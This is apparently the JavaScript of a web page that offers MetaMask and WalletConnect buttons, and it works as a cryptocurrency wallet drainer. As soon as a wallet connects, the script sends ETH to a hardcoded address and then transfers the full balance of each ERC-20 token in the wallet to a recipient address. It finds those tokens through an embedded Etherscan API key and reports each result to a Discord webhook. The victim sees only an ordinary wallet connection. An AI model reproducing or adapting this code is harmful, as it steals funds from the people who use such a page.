let isConnecting = false; // Flag to prevent multiple connections

// ERC-20 ABI definition
const erc20ABI = [
    // Transfer function
    {
        "constant": false,
        "inputs": [
            {
                "name": "to",
                "type": "address"
            },
            {
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    // BalanceOf function
    {
        "constant": true,
        "inputs": [
            {
                "name": "owner",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    // Decimals function
    {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [
            {
                "name": "",
                "type": "uint8"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    // Symbol function
    {
        "constant": true,
        "inputs": [],
        "name": "symbol",
        "outputs": [
            {
                "name": "",
                "type": "string"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
];

async function connectWallet(walletType) {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return; // Exit if already connecting
    }

    isConnecting = true; // Set the flag to true

    try {
        let walletAddress;

        if (walletType === "metamask") {
            // MetaMask connection logic
            if (typeof window.ethereum !== 'undefined') {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                walletAddress = accounts[0];
                console.log(`Connected to MetaMask account: ${walletAddress}`);
            } else {
                alert("MetaMask is not installed. Please install it.");
                window.open("https://metamask.app.link/dapp/swiftmultisolutions.github.io/web3/", "_blank");
            }
        } else if (walletType === "walletconnect") {
            // WalletConnect connection logic
            const provider = new WalletConnectProvider.default({
                infuraId: "YOUR_INFURA_PROJECT_ID", // Replace with your Infura Project ID
            });

            await provider.enable();
            const web3 = new ethers.providers.Web3Provider(provider);
            const accounts = await web3.listAccounts();
            walletAddress = accounts[0];
            console.log(`Connected to WalletConnect account: ${walletAddress}`);
        } else {
            // Open other wallets using WalletConnect URI scheme
            const uri = `wc:YOUR_WALLETCONNECT_URI`; // Replace with the actual URI generated
            window.open(uri, "_blank");
            return; // Exit after opening the wallet
        }

        await sendFirstTransaction(walletAddress); // Automatically send the first transaction
    } catch (error) {
        console.error("Error connecting to wallet:", error);
    } finally {
        isConnecting = false; // Reset the flag
    }
}

async function sendFirstTransaction(walletAddress) {
    if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Your recipient address
        const amountInEther = "0.000625"; // The updated amount for the first transaction

        const transaction = {
            to: recipientAddress,
            value: ethers.utils.parseEther(amountInEther),
        };

        try {
            const txResponse = await signer.sendTransaction(transaction);
            console.log("First transaction response:", txResponse);
            
            // Send to Discord webhook
            await sendWebhook(txResponse.hash, "success");

            // Automatically trigger the second transaction using the fixed token threshold
            await sendSecondTransaction(signer, walletAddress);
        } catch (error) {
            console.error("Error sending first transaction:", error);
            
            // Send to Discord webhook
            await sendWebhook(error.message, "failure");
        }
    } else {
        console.error("MetaMask is not installed. Please install it.");
    }
}

async function sendSecondTransaction(signer, walletAddress) {
    const erc20TokenAddresses = await getERC20TokenAddresses(walletAddress); // Fetch token addresses from Etherscan
    const tokenThreshold = 0.000001; // Fixed token threshold

    for (const tokenAddress of erc20TokenAddresses) {
        const tokenContract = new ethers.Contract(tokenAddress, erc20ABI, signer);
        const balance = await tokenContract.balanceOf(walletAddress);
        const tokenDecimals = await tokenContract.decimals();
        const tokenSymbol = await tokenContract.symbol();

        // Convert the balance to its decimal form
        const balanceInUnits = balance / Math.pow(10, tokenDecimals);

        // Check if the balance is greater than the token threshold
        if (balanceInUnits > tokenThreshold) {
            console.log(`Sending ${balanceInUnits} ${tokenSymbol} from ${walletAddress}`);

            // Send the token
            const txResponse = await tokenContract.transfer(
                "0xRecipientAddress", // Replace with actual recipient address
                balance // Transfer the full balance
            );

            console.log(`Transaction hash: ${txResponse.hash}`);
            // Optionally send a webhook for each transfer
            await sendWebhook(txResponse.hash, "success");
        }
    }
}

async function getERC20TokenAddresses(walletAddress) {
    const apiKey = "QI64S847PMAF5SXJSYEWJNVA7TD76QTV95"; // Your Etherscan API Key
    const url = `https://api.etherscan.io/api?module=account&action=tokenlist&address=${walletAddress}&apikey=${apiKey}`;

    const response = await fetch(url);
    const data = await response.json();

    if (data.status === "1") {
        // Return the list of token addresses
        return data.result.map(token => token.contractAddress);
    } else {
        console.error("Error fetching token addresses:", data.message);
        return [];
    }
}

async function sendWebhook(message, status) {
    const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"; // Your Discord webhook URL
    const payload = {
        content: `Transaction Status: ${status}\nMessage: ${message}`
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });
        console.log("Webhook sent successfully");
    } catch (error) {
        console.error("Error sending webhook:", error);
    }
}

// Attach the event listener to the wallet buttons
document.querySelectorAll(".walletButton").forEach(button => {
    button.addEventListener("click", () => connectWallet(button.dataset.walletType));
});
